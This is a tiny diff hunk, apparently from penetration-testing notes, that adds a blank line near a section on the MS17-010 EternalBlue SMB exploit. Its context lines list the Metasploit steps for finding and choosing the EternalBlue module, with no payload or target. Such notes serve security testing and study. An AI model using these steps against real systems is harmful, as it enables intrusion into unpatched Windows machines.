@@ -74,6 +74,7 @@
 
 --MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption--
 
+
 > msfconsole
 > search eternal
 > find eternal blue module and copy it (exploit/windows/smb/ms17_010_eternalblue)
